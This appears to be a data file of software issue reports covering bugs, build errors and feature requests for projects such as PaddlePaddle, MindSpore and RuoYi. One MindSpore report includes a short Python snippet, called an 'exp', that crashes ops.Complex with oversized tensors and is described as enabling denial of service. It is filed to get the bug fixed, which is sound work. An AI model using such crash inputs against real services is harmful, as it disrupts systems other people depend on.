<!-- 数据范围过滤 -->  ${params.dataScope}初始加载时会报错,"跟了代码，此处作者的意思是想要跟一个查询的条件，前端动态传值params，后端封装好查询条件，组装成sql执行，但是此处只有在前端组装查询条件时才有值啊，我刚开始加载的时候，mybatis就会报解析不出的错误，求解   <code>: Caused by: org.apache.ibatis.ognl.OgnlException: source is null for getProperty(null, ""dataScope"")"
点击代码生成-编辑-控制台异常,"启动auth ，gateway，gen，system，后 登录生成 -系统工具-代码生成-编辑 然后控制台报错   <code>: 16:19:38.567 [http-nio-8201-exec-2] ERROR c.o.c.s.h.GlobalExceptionHandler - [handleException,51] - JSON parse error: Illegal character ((CTRL-CHAR, code 31)): only regular white space (\r, \n, \t) is allowed between tokens; nested exception is com.fasterxml.jackson.core.JsonParseException: Illegal character ((CTRL-CHAR, code 31)): only regular white space (\r, \n, \t) is allowed between tokens at [Source: (PushbackInputStream); line: 1, column: 2] org.springframework.http.converter.HttpMessageNotReadableException: JSON parse error: Illegal character ((CTRL-CHAR, code 31)): only regular white space (\r, \n, \t) is allowed between tokens; nested exception is com.fasterxml.jackson.core.JsonParseException: Illegal character ((CTRL-CHAR, code 31)): only regular white space (\r, \n, \t) is allowed between tokens at [Source: (PushbackInputStream); line: 1, column: 2] at org.springframework.http.converter.json.AbstractJackson2HttpMessageConverter.readJavaType(AbstractJackson2HttpMessageConverter.java:284) at org.springframework.http.converter.json.AbstractJackson2HttpMessageConverter.read(AbstractJackson2HttpMessageConverter.java:242) at org.springframework.web.servlet.mvc.method.annotation.AbstractMessageConverterMethodArgumentResolver.readWithMessageConverters(AbstractMessageConverterMethodArgumentResolver.java:205) at org.springframework.web.servlet.mvc.method.annotation.RequestResponseBodyMethodProcessor.readWithMessageConverters(RequestResponseBodyMethodProcessor.java:158) at org.springframework.web.servlet.mvc.method.annotation.RequestResponseBodyMethodProcessor.resolveArgument(RequestResponseBodyMethodProcessor.java:131) at org.springframework.web.method.support.HandlerMethodArgumentResolverComposite.resolveArgument(HandlerMethodArgumentResolverComposite.java:121) at org.springframework.web.method.support.InvocableHandlerMethod.getMethodArgumentValues(InvocableHandlerMethod.java:167) at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:134) at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:105) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:878) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:792) at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1040) at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:943) at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:909) at javax.servlet.http.HttpServlet.service(HttpServlet.java:665) at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883) at javax.servlet.http.HttpServlet.service(HttpServlet.java:750) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.boot.actuate.metrics.web.servlet.WebMvcMetricsFilter.doFilterInternal(WebMvcMetricsFilter.java:93) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:202) at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:97) at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:541) at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:143) at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92) at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:78) at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343) at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:374) at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:868) at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1590) at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) at java.lang.Thread.run(Thread.java:748) Caused by: com.fasterxml.jackson.core.JsonParseException: Illegal character ((CTRL-CHAR, code 31)): only regular white space (\r, \n, \t) is allowed between tokens at [Source: (PushbackInputStream); line: 1, column: 2] at com.fasterxml.jackson.core.JsonParser._constructError(JsonParser.java:1851) at com.fasterxml.jackson.core.base.ParserMinimalBase._reportError(ParserMinimalBase.java:707) at com.fasterxml.jackson.core.base.ParserMinimalBase._throwInvalidSpace(ParserMinimalBase.java:685) at com.fasterxml.jackson.core.json.UTF8StreamJsonParser._skipWSOrEnd(UTF8StreamJsonParser.java:3007) at com.fasterxml.jackson.core.json.UTF8StreamJsonParser.nextToken(UTF8StreamJsonParser.java:719) at com.fasterxml.jackson.databind.ObjectMapper._initForReading(ObjectMapper.java:4662) at com.fasterxml.jackson.databind.ObjectMapper._readMapAndClose(ObjectMapper.java:4511) at com.fasterxml.jackson.databind.ObjectMapper.readValue(ObjectMapper.java:3519) at org.springframework.http.converter.json.AbstractJackson2HttpMessageConverter.readJavaType(AbstractJackson2HttpMessageConverter.java:273) ... 55 common frames omitted 16:21:43.467 [com.alibaba.nacos.naming.beat.sender] ERROR c.a.n.client.naming - [callServer,613] - [NA] failed to request java.net.SocketTimeoutException: connect timed out at java.net.PlainSocketImpl.socketConnect(Native Method) at java.net.AbstractPlainSocketImpl.doConnect(AbstractPlainSocketImpl.java:476) at java.net.AbstractPlainSocketImpl.connectToAddress(AbstractPlainSocketImpl.java:218) at java.net.AbstractPlainSocketImpl.connect(AbstractPlainSocketImpl.java:200) at java.net.SocksSocketImpl.connect(SocksSocketImpl.java:394) at java.net.Socket.connect(Socket.java:606) at sun.net.NetworkClient.doConnect(NetworkClient.java:175) at sun.net.www.http.HttpClient.openServer(HttpClient.java:463) at sun.net.www.http.HttpClient.openServer(HttpClient.java:558) at sun.net.www.http.HttpClient.&lt;init&gt;(HttpClient.java:242) at sun.net.www.http.HttpClient.New(HttpClient.java:339) at sun.net.www.http.HttpClient.New(HttpClient.java:357) at sun.net.www.protocol.http.HttpURLConnection.getNewHttpClient(HttpURLConnection.java:1226) at sun.net.www.protocol.http.HttpURLConnection.plainConnect0(HttpURLConnection.java:1162) at sun.net.www.protocol.http.HttpURLConnection.plainConnect(HttpURLConnection.java:1056) at sun.net.www.protocol.http.HttpURLConnection.connect(HttpURLConnection.java:990) at com.alibaba.nacos.common.http.client.request.JdkHttpClientRequest.execute(JdkHttpClientRequest.java:109) at com.alibaba.nacos.common.http.client.NacosRestTemplate.execute(NacosRestTemplate.java:482) at com.alibaba.nacos.common.http.client.NacosRestTemplate.exchangeForm(NacosRestTemplate.java:427) at com.alibaba.nacos.client.naming.net.NamingProxy.callServer(NamingProxy.java:599) at com.alibaba.nacos.client.naming.net.NamingProxy.reqApi(NamingProxy.java:524) at com.alibaba.nacos.client.naming.net.NamingProxy.reqApi(NamingProxy.java:491) at com.alibaba.nacos.client.naming.net.NamingProxy.sendBeat(NamingProxy.java:426) at com.alibaba.nacos.client.naming.beat.BeatReactor$BeatTask.run(BeatReactor.java:167) at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511) at java.util.concurrent.FutureTask.run$$$capture(FutureTask.java:266) at java.util.concurrent.FutureTask.run(FutureTask.java) at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.access$201(ScheduledThreadPoolExecutor.java:180) at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.run(ScheduledThreadPoolExecutor.java:293) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at java.lang.Thread.run(Thread.java:748)"
Name of the layer cannot work,"Hello, i want to know whether this is my fault: in your documents, you suppose us to define the name of layer when yield just like this: and i follow your recommendation to yield like this: then define the data_layer: but when i start to train the model, there are some errors: i try to solve this problem, and i found if i delete the define of layer in yield code, it can successfully train the model: is this my fault or the architecture's fault? if this is my fault, how can i solve this problem if i want fo define the name of layer in yield.   <code>: yield { ""pixel"": pixels_float, 'label': int(label) } yield {""fea_list"":fea_list,""label"":label} data = data_layer(name=""fea_list"", size=40) I0926 14:43:32.013584 28460 Util.cpp:113] Calling runInitFunctions I0926 14:43:32.014166 28460 Util.cpp:126] Call runInitFunctions done. [INFO 2016-09-26 14:43:32,073 networks.py:960] The input order is [fea_list, label] [INFO 2016-09-26 14:43:32,073 networks.py:963] The output order is [__cost_1__] I0926 14:43:32.075378 28460 Trainer.cpp:169] trainer mode: Normal I0926 14:43:32.075925 28460 PyDataProvider2.cpp:219] loading dataprovider dataprovider_verify::process I0926 14:43:32.076998 28460 PyDataProvider2.cpp:219] loading dataprovider dataprovider_verify::process I0926 14:43:32.077082 28460 GradientMachine.cpp:134] Initing parameters.. I0926 14:43:32.077148 28460 GradientMachine.cpp:141] Init parameters done. F0926 14:43:32.077504 28460 PythonUtil.h:197] Check failed: PySequence_Check(seq_) yield fea_list,label"
新增弹窗关闭时没有销毁Dialog中的元素,版本：2.8.12 查看了源码里面是有预留这个属性的，可是没效果，文档上也没有写这个属性 希望能早点支持这个属性 这样大家就不用再手写一个弹窗了 以下是我调用打开弹窗的方法   <code>: this.$refs.crud.rowAdd()
Fluid data pipeline interface,"The data pipeline (processing and reading) in a traditional deep learning framework is typically defined in Python scripts, utilizing many Python libraries. We propose a new data pipeline scheme based on Unix pipe, utilizing all executables, including Python scripts. Read Data from stdin A typical use case is a Fluid training program reads mini-batches from stdin: In the above command, is a file encoded with Fluid data format. It contains a sequence of training data entries. runs a Fluid program that trains a neural network, reading the training data from stdin. Here is an example of : The code block inside the with statement will be iterated every mini-batch, until EOF is read from stdin. Output Data to stdout In the above, the trained parameters is saved to stdout after the training iterations.: We can have a that reads the parameters from stdin and test the model accuracy: We can use this command to train, test and pretty print the test result: Interprocess Communicating with Non-Fluid Programs Non-Fluid programs can communicate with Fluid programs as long as they understands the Fluid data format. We will provide APIs for Non-Fluid programs to read and write data to file descriptors. In the code below, preprocess the data from stdin before writing it to stdout: We can then chain it to our training process: We will provide the equivalent C++ API so the user can write high efficient C++ programs that interact with Fluid programs. Run Fluid Program from Python All the above examples run Fluid program inside bash with . We can run Fluid from Python as well, fully compatible with the Fluid data pipeline interface. Please see examples in https://github.com/PaddlePaddle/Paddle/issues/9912.   <code>: $ cat ~/dataset/fit_a_line | paddle run train.py ~/dataset/fit_a_line paddle run train.py train.py from paddle import fluid reader = fluid.reader(""/dev/stdin"") with reader.iterate(): x = fluid.layers.data(name=""feature"") label = fluid.layers.data(name=""label"") y_predict = fluid.layers.fc(input=x, size=1, act=None) cost = fluid.layers.square_error_cost(input=y_predict, label=label) avg_cost = fluid.layers.mean(cost) sgd_optimizer = fluid.optimizer.SGD(learning_rate=0.001) sgd_optimizer.minimize(avg_cost) writer = fluid.writer(os.stdout) fluid.save_parameters(writer=writer) train.py writer = fluid.writer(""/dev/stdout"") fluid.save_parameters(writer=writer) test.py from paddle import fluid model_reader = fluid.reader(""/dev/stdin"") test_reader = fluid.reader(""~/dataset/testset/test"") writer = fluid.writer(""/dev/stdout"") fluid.load_parameters(reader=model_reader) with test_reader.iterate(): x = fluid.layers.data(name=""feature"") label = fluid.layers.data(name=""label"") y_predict = fluid.layers.fc(input=x, size=1, act=None) cost = fluid.layers.square_error_cost(input=y_predict, label=label) writer.write(cost) $ cat ~/dataset/fit_a_line | paddle run train.py | paddle run test.py | paddle pretty_print preprocess.py from paddle import fluid w = fluid.write_to(""/dev/stdout"") w.set_columns(""feature"", ""label"") r = fluid.read_from(""/dev/stdin"") for entry in r: feature = entry[""feature""] label = entry[""label""] # feature and label are both numpy.ndarray new_feature = some_preprocessing(feature) # new_feature is a numpy.ndarray, it will be serialized to a format # that can be deserialized to fluid.lod_tensor. w.write(new_feature, label) $ cat ~/dataset/fit_a_line | python preprocess.py | paddle run train.py paddle run *.py"
DeepFM demo运行问题,"我运行demo，报以下的错误 使用的是paddlepaddle-0.10.0-cp27-cp27m-linux_x86_64.whl，这个版本的包，是不是这个版本还不支持？   <code>: I1211 14:29:43.642339 31648 Util.cpp:166] commandline: --use_gpu=False --trainer_count=1 Traceback (most recent call last): File ""train.py"", line 107, in &lt;module&gt; train() File ""train.py"", line 62, in train model = DeepFM(args.factor_size) File ""/XXX/models/deep_fm/network_conf.py"", line 39, in DeepFM fm_param_attr=paddle.attr.Param(name=""DenseFeatFactors"")) File ""/XXX/models/deep_fm/network_conf.py"", line 10, in fm_layer second_order = paddle.layer.factorization_machine( AttributeError: 'module' object has no attribute 'factorization_machine'"
PhalApi_Model_NotORM -- loadTableKeys 方法中tables变量获取问题,"PhalApi_Model_NotORM -- loadTableKeys方法如下: 问题点: 1.获取配置文件为dbs.php中如果文件改名将读取不到 2.多数据库配置文件中此处只会获取dbs中的tables,会修改dbs的tables影响全局   <code>: protected function loadTableKeys() { $tables = DI()-&gt;config-&gt;get('dbs.tables'); if (empty($tables)) { throw new PhalApi_Exception_InternalServerError(T('dbs.tables should not be empty')); } foreach ($tables as $tableName =&gt; $tableConfig) { if (isset($tableConfig['start']) &amp;&amp; isset($tableConfig['end'])) { for ($i = $tableConfig['start']; $i &lt;= $tableConfig['end']; $i ++) { self::$tableKeys[$tableName . '_' . $i] = $tableConfig['key']; } } else { self::$tableKeys[$tableName] = $tableConfig['key']; } } }"
`mindspore.ops.Complex` can trigger segfault,"can trigger segfault which can lead to security problem and at least attacker can do denial-of-service attack. Seems due to missing check and caused . / 硬件环境: Not related. : -- MindSpore version : 1.9.0 -- Python version : 3.8.10 -- OS platform and distribution : Not related -- GCC/Compiler version : Not related (/): /mode pynative /mode graph Here is the exp: Just run the exp mentioned above. At least it cannot be segfault. If the testcase is not allowed, it should raise exceptions, rather than segfault (maybe memory errors or some other security problems). pass   <code>: mindspore.ops.Complex OOM (out of memory) import numpy as np import mindspore as ms from mindspore.ops import Complex Complex()( ms.Tensor(np.random.uniform(-6666666, 100000000, [4, 8, 8, 8, 8, 4, 8, 8]).astype(np.float64)), ms.Tensor(np.random.uniform(-6666666, 100000000, [2, 8, 4, 4]).astype(np.float64)) )"
时间格式化中timeFormat函数输入2000年之前的时间显示1970-01-01,"你好，请使用下面的链接创建 issue 以帮助我们更快的排查问题，不规范的 issue 会被关闭，感谢配合。 https://new-issue.uviewui.com/ 请在 uview-ui/libs/function/timeFormat.js的timeFormat函数 uview-ui/libs/function/timeFrom.js的timeFrom函数 加入以下   <code>: if (dateTime.toString().length == 10) dateTime *= 1000; if (dateTime.toString().length == 9) dateTime *= 1000; function timeFormat(dateTime = null, fmt = 'yyyy-mm-dd') { if (!dateTime) return '' // 如果为null,则格式化当前时间 if (!dateTime) dateTime = Number(new Date()); // 如果dateTime长度为10或者13，则为秒和毫秒的时间戳，如果超过13位，则为其他的时间格式 if (dateTime.toString().length == 10) dateTime *= 1000; if (dateTime.toString().length == 9) dateTime *= 1000; let date = new Date(dateTime); let ret; let opt = { ""y+"": date.getFullYear().toString(), // 年 ""m+"": (date.getMonth() + 1).toString(), // 月 ""d+"": date.getDate().toString(), // 日 ""h+"": date.getHours().toString(), // 时 ""M+"": date.getMinutes().toString(), // 分 ""s+"": date.getSeconds().toString() // 秒 // 有其他格式化字符需求可以继续添加，必须转化成字符串 }; for (let k in opt) { ret = new RegExp(""("" + k + "")"").exec(fmt); if (ret) { fmt = fmt.replace(ret[1], (ret[1].length == 1) ? (opt[k]) : (opt[k].padStart(ret[1].length, ""0""))) }; }; return fmt; }"
reduce build warning,"and   <code>: [ 58%] Building CXX object paddle/api/CMakeFiles/paddle_api.dir/Parameter.cpp.o /Users/qiaolongfei/project/paddle/paddle/gserver/gradientmachines/RecurrentGradientMachine.cpp:1402:23: warning: comparison of integers of different signs: 'int' and 'size_type' (aka 'unsigned long') [-Wsign-compare] for (int i = 0; i &lt; finalPaths_.size(); ++i) { ~ ^ ~~~~~~~~~~~~~~~~~~ /Users/qiaolongfei/project/paddle/paddle/gserver/gradientmachines/RecurrentGradientMachine.cpp:1403:25: warning: comparison of integers of different signs: 'int' and 'size_type' (aka 'unsigned long') [-Wsign-compare] for (int j = 0; j &lt; finalPaths_[i].size(); ++j) { [ 69%] Building CXX object paddle/operators/CMakeFiles/net_op_test.dir/net_op_test.cc.o In file included from /Users/qiaolongfei/project/paddle/paddle/operators/net_op_test.cc:3: /Users/qiaolongfei/project/paddle/cmake-build-debug/third_party/install/gtest/include/gtest/gtest.h:1392:11: warning: comparison of integers of different signs: 'const int' and 'const unsigned long' [-Wsign-compare] if (lhs == rhs) { ~~~ ^ ~~~ /Users/qiaolongfei/project/paddle/cmake-build-debug/third_party/install/gtest/include/gtest/gtest.h:1421:12: note: in instantiation of function template specialization 'testing::internal::CmpHelperEQ&lt;int, unsigned long&gt;' requested here return CmpHelperEQ(lhs_expression, rhs_expression, lhs, rhs); ^ /Users/qiaolongfei/project/paddle/paddle/operators/net_op_test.cc:82:3: note: in instantiation of function template specialization 'testing::internal::EqHelper&lt;false&gt;::Compare&lt;int, unsigned long&gt;' requested here ASSERT_EQ(2, new_net-&gt;ops_.size()); ^ /Users/qiaolongfei/project/paddle/cmake-build-debug/third_party/install/gtest/include/gtest/gtest.h:1956:32: note: expanded from macro 'ASSERT_EQ' # define ASSERT_EQ(val1, val2) GTEST_ASSERT_EQ(val1, val2) ^ /Users/qiaolongfei/project/paddle/cmake-build-debug/third_party/install/gtest/include/gtest/gtest.h:1939:63: note: expanded from macro 'GTEST_ASSERT_EQ' EqHelper&lt;GTEST_IS_NULL_LITERAL_(val1)&gt;::Compare, \"
Proposal: remove get_place and set_place,"Currently in paddle/platform/place.h we have It looks convenient and flexible being able to create a Tensor on the default device. However, it also makes it possible that some tensors created on an explicitly specified device cannot work together with those on the default device if the specified one differs from the default one. This can be summarized as the evil of <em>mutable</em> global variables. Let's remove them, and require that places are always specified explicitly.   <code>: void set_place(const Place &amp;); const Place &amp;get_place();"
【AICC】UnsortedSegment[Ops]算子的开发优化 和 张量使用bool索引的特性开发,"Requirement Use this template for Confirmed requirements 您好，目前mindspore支持(Unsorted)SegmentSum(MAX/MIN)，我们进行了测试，部分算子（UnsortSegmentSum, UnsortSegmnetMax）大概比其他框架慢一个数量级左右，也尚能接受。我们在Sum的基础上实现了Mean，但是不太理想，速度慢很多。 下面是测试结果： （软硬件：GPU:3090Ti, cuda:11.1） duration(s) unsort segmnet sum segmnet sum unsort segmnet mean segmnet mean unsort segment max segmnet max mindspore 9.3154 0.0358 85.6162 80.1892 7.1695 0.0625 tensorflow 1.2284 0.4032 1.73 1.2078 1.7062 1.426 另外我们注意到，mindspore的张量不支持使用 布尔掩码 索引的方式，如pytorch的一个例子 诉求: 1、能否实现一下Mean算子 2、其他算子(UnsortSegmentSum, UnsortSegmnetMax)还有优化空间吗 3. 是否能够开发这种索引方式的特性 Backgroud（背景信息） 在开发GNN模型的过程中我们遇到了相关的需求 Origin（信息来源） 北京邮电大学 石川教授组 Benefit / Necessity （价值/作用） 提高特定算子的计算效率 增加张量使用的易用性和灵活性 Design（设计方案） 诉求 1：(unsorted) segment mean相关的设计方案可以参考tensorflow 诉求 3： 已在上文中提到   <code>: &gt;&gt;&gt; import torch &gt;&gt;&gt; i = torch.tensor([True, False,True, False], dtype=bool) &gt;&gt;&gt; x = torch.arange(12).reshape(4,3) &gt;&gt;&gt; x tensor([[ 0, 1, 2], [ 3, 4, 5], [ 6, 7, 8], [ 9, 10, 11]]) &gt;&gt;&gt; x[i] tensor([[0, 1, 2], [6, 7, 8]])"
【众智】【计算-用户接口】Addr,"Addr functional接口 计算: out=<em>β</em> input + <em>α</em> (vec1 ? vec2) functional接口（小写加下划线） 接口目录：mindspore/python/mindspore/ops/function/math_func.py 支持数据类型 PyTorch1.8.1接口： torch.addr https://pytorch.org/docs/1.8.1/generated/torch.addr.html 3. 异常处理 4. 算子反向 通过小算子拼接自动求解反向   <code>: def addr(input: tensor, vec1: tensor, vec2: tensor, *, beta: number=1, alpha: number=1) -&gt; tensor: return y CPU：float16、float32、float64 GPU：float16、float32、float64 Ascend：float16、float32、int32、int64"
"[CT][MS][MaxPool3DWithArgmax]When the input type of the MaxPool3DWithArgmax operator is int16, the precision is incorrect.","MaxPool3DWithArgmax算子输入int16类型时有偶现精度问题 / 硬件环境: /device CPU : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph test_p_maxpool3dwithargmax_input_int16 CPU后端执行用例pytest -s test_maxpool3dwithargmax.py::test_p_maxpool3dwithargmax_input_int16 --count=30 或者pytest -vra test_maxpool3dwithargmax.py pass   <code>: @Author('zwx1059847') @Level2 def test_p_maxpool3dwithargmax_input_int16(): fact = MaxPool3DWithArgmaxMock(input_shape=(5, 4, 9, 4, 7), dtype=np.int16, attributes={'ksize': (4, 3, 4), 'strides': (1), 'pads': (1, 1, 1), 'dilation': (1, 1, 1), 'ceil_mode': False, 'data_format': 'NCDHW', 'argmax_type': mstype.int64}) fact.forward_cmp() &gt; fact.grad_cmp() test_maxpool3dwithargmax.py:115: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/primitive/maxpool3dwithargmax_ops.py:178: in grad_cmp allclose_nparray(input_grad_pytorch, input_grad_mindspore, self.loss, self.loss) ../share/utils.py:31: in allclose_nparray _count_unequal_element(data_expected, data_me, rtol, atol) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ data_expected = array([[[[[8, 4, 4, ..., 4, 0, 0], [4, 2, 2, ..., 2, 0, 0], [4, 2, 2, ..., 2, 0, 0], [0,... [0, 0, 0, ..., 0, 0, 0], [0, 0, 0, ..., 0, 0, 0], [0, 0, 0, ..., 0, 0, 0]]]]], dtype=int16) data_me = array([[[[[ 8, 4, 4, ..., 4, 0, 0], [ 4, 2, 2, ..., 2, 0, 0], [ 4, 2, 2, ..., 2, 0, ...0, ..., 0, 0, 0], [ 0, 0, 0, ..., 0, 0, 0], [ 0, 0, 0, ..., 0, 0, 0]]]]], dtype=int16) rtol = 0, atol = 0 def _count_unequal_element(data_expected, data_me, rtol, atol): assert data_expected.shape == data_me.shape total_count = len(data_expected.flatten()) error = np.abs(data_expected - data_me) greater = np.greater(error, atol + np.abs(data_me) * rtol) loss_count = np.count_nonzero(greater) assert (loss_count / total_count) &lt; rtol, \ ""\ndata_expected_std:{0}\ndata_me_error:{1}\nloss:{2}"". \ &gt; format(data_expected[greater], data_me[greater], error[greater]) E AssertionError: E data_expected_std:[2 1 0 1 0 0 4 2 1 0 1 0 0 4 2 1 0 1 0 0 4 2 1 0 1 0 0 4 2 1 0 1 0 0 0 0 0 E 0 0 0 0 0 0 0 0 0 0 0 8 4 2 0 2 0 0 4 2 1 0 1 0 0 4 2] E data_me_error:[ 5 5 2 3 3 4 12 10 10 10 9 8 9 14 10 9 15 17 16 2 19 18 17 8 E 16 16 16 12 11 11 8 9 27 16 16 14 27 16 16 14 27 16 16 35 30 34 35 35 E 35 31 30 29 29 27 28 33 29 28 35 36 30 34 39 37] E loss:[ 3 4 2 2 3 4 8 8 9 10 8 8 9 10 8 8 15 16 16 2 15 16 16 8 E 15 16 16 8 9 10 8 8 27 16 16 14 27 16 16 14 27 16 16 35 30 34 35 35 E 27 27 28 29 27 27 28 29 27 27 35 35 30 34 35 35] ../share/utils.py:24: AssertionError"
表单中的cascader组件设置必填规则后出现bug,"cascader组件设置必填规则后，第一次虽然选中选项但仍然提示请选择的信息，Avue官网例子也是如此。   <code>: { column: [ { type: 'cascader', label: '级联选择器', span: 24, display: true, dicData: [ { label: '选项一', value: 0, children: [ { label: '选项1-1', value: 11 }, { label: '选项1-2', value: 12 } ] }, { label: '选项二', value: '1' }, { label: '选项三', value: '2' } ], cascaderIndex: 1, showAllLevels: true, separator: '/', props: { label: '', value: '' }, rules: [ { required: true, message: '请选择', trigger: 'change' } ], prop: '1610964351619_9958' } ], labelPosition: 'left', labelSuffix: '：', labelWidth: 180, gutter: 0, menuBtn: true, submitBtn: true, submitText: '提交', emptyBtn: true, emptyText: '清空', menuPosition: 'center' }"
【众智】【数据算子】PhaseVocoder,"1 功能介绍 phase_vocoder 一个相位声码器，用于在不改变音调的情况下改变波形的速度。 phase_vocoder基于时域压扩（Time-scale modification简称TSM,又叫变速不变调）实现。整体流程如下所示：分为analysis,Processing以及Synthesis三个步骤PhaseVocoder的整体思路是在频域上，保留原始的幅度，然后根据时间计算下一帧的相位。从而预估一个新的帧。 假设变速速率为2，即为两倍速。转到频域后，第一帧数据从输入信号x取定。预估第二帧数据，因为变速为2，则跳过第二帧，取第三帧数据的幅度，再根据时间计算对应的相位，重组成新的一帧。以此原理，最后重新生成一个两倍速的音频。 示意图如下： Python接口 __init__参数 rate float 加速或者放慢的比例 phase_advance numpy（元素均float） 每个帧频率预期的相位推进。长度为freq，其中freq与输入的STFT变量的freq一致。 2.2 C++层接口 与python接口不同的地方如下 __init__参数 output format:&lt;…,freq,time,complex=2 &gt; input format:&lt;…,freq,time,complex=2 &gt;   <code>: 1. class mindspore.dataset.audio.transforms.PhaseVocoder(rate,phase_advance) 1.1. const std::shared_ptr&lt;Tensor&gt; &amp;input, std::shared_ptr&lt;Tensor&gt; *output, float rate,const std::shared_ptr&lt;Tensor&gt; &amp;phase_advance"
[MS][GPU] master分支编译ompi_4.0.3报错,"环境：ubuntu 22.04 cmake version 3.22.1 <ol start=""3""> 【Existing Issues】/【存在的问题】 报错如下： 查看出错的./configure文件的第 13028行，发现明显语法错误： 多次执行编译脚本依旧无法解决该问题。 <ol start=""4""> 【Expected Result】【预期结果】 成功编译 Please fill in the expected result   <code>: bash build.sh -e gpu -j 30 ================================================ Open MPI autogen: completed successfully. w00t! ================================================ checking for perl... perl ============================================================================ == Configuring Open MPI ============================================================================ *** Startup tests checking build system type... x86_64-pc-linux-gnu checking host system type... x86_64-pc-linux-gnu checking target system type... x86_64-pc-linux-gnu checking for gcc... gcc checking whether the C compiler works... yes checking for C compiler default output file name... a.out checking for suffix of executables... checking whether we are cross compiling... no checking for suffix of object files... o checking whether the compiler supports GNU C... yes checking whether gcc accepts -g... yes checking for gcc option to enable C11 features... none needed checking whether gcc understands -c and -o together... yes checking for stdio.h... yes checking for stdlib.h... yes checking for string.h... yes checking for inttypes.h... yes checking for stdint.h... yes checking for strings.h... yes checking for sys/stat.h... yes checking for sys/types.h... yes checking for unistd.h... yes checking for wchar.h... yes checking for minix/config.h... no checking whether it is safe to define __EXTENSIONS__... yes checking whether _XOPEN_SOURCE should be defined... no checking for a BSD-compatible install... /usr/bin/install -c checking whether build environment is sane... yes checking for a race-free mkdir -p... /usr/bin/mkdir -p checking for gawk... gawk checking whether make sets $(MAKE)... 